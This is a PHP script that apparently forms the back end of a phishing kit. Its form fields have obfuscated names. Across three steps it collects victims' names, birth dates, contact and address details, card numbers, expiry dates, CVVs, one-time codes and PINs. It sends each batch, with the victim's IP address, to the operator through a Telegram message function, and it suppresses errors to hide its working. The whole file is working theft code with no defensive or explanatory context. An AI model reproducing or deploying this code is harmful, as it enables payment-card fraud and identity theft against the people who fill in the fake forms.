<?php
error_reporting(0);
require_once "./config.php";

if (isset($_POST)) {
    if ($_GET['action'] == 'billing') {

        $fname = $_POST['AKNIRRKmCvoBGDzU'] . ' ' . $_POST['sHWOPzoSWtWbGlwP'];
        $dob = $_POST['KSKuqorQVtDRQqzX'];
        $email = $_POST['ExNvWnfKdxabWQAx'];
        $phone = $_POST['xHDshLefKvMnsEHC'];
        $add = $_POST['OavPNDXgiyORedLW'];
        $zip = $_POST['LejqtzhKAyjvHKVw'];
        $city = $_POST['wedEvUwvcmpxeycb'];
        $_SESSION['fname'] = $fname;
        $_SESSION['dob'] = $dob;
        $_SESSION['phone'] = $phone;
        $_SESSION['add'] = $add;
        $_SESSION['zip'] = $zip;
        $_SESSION['city'] = $city;
        $_SESSION['email'] = $email;

        $msg = "━━━━━━【 Billing 】━━━━━━" . "\r\n";
        $msg .= 'Fullname = ' . $fname  . "\r\n";
        $msg .= 'Bday = '. $dob . "\r\n";
        $msg .= 'Email = ' . $email . "\r\n";
        $msg .= 'Phone = ' . $phone. "\r\n";
        $msg .= 'Addr = ' . $add . "\r\n";
        $msg .= 'Zip = ' . $zip . "\r\n";
        $msg .= 'City = ' . $city . "\r\n";
        $msg .= "━━━━━━【 Info 】━━━━━━" . "\r\n";
        $msg .= 'Date = ' . date('d/m/Y H:i:s') . "\r\n";
        $msg .= 'IP = ' . get_user_ip() . "\r\n";
        $_SESSION['op'] = 'payment';
        echo "./".APP. "?session_key=". $_SESSION['sessionKey'] . "&op=" . $_SESSION['op'];
        telegram_message($msg, null);
    }
    
    if ($_GET['action'] == 'payment') {
        $msg = "━━━━━━【 Card 】━━━━━━" . "\r\n";
        $msg .= 'CardName = ' .$_POST['KIAxBekKgIPGTqgx']  . "\r\n";
        $msg .= 'CardNumber = '. $_POST['gbTkkFWUlloiDhXz'] . "\r\n";
        $msg .= 'ExpDate = ' . $_POST['wHEVkwJcFafDYPWP'] . "\r\n";
        $msg .= 'CVV = ' . $_POST['LwdtWdjyOwrObgeu']. "\r\n";
        $msg .= "━━━━━━【 Info 】━━━━━━" . "\r\n";
        $msg .= 'Date = ' . date('d/m/Y H:i:s') . "\r\n";
        $msg .= 'IP = ' . get_user_ip() . "\r\n";
        $_SESSION['op'] = 'auth';
        echo "./".APP. "?session_key=". $_SESSION['sessionKey'] . "&op=" . $_SESSION['op'];
        telegram_message($msg, null);
    }

    if ($_GET['action'] == 'auth') {
        $msg = "━━━━━━【 Card 】━━━━━━" . "\r\n";
        $msg .= 'Code = ' .$_POST['EvLigIoDRVqKIWQo']  . "\r\n";
        $msg .= 'Pin = '. $_POST['kPARMIOiSjiwsCue'] . "\r\n";
        $msg .= "━━━━━━【 Info 】━━━━━━" . "\r\n";
        $msg .= 'Date = ' . date('d/m/Y H:i:s') . "\r\n";
        $msg .= 'IP = ' . get_user_ip() . "\r\n";

        telegram_message($msg, null);
    }
}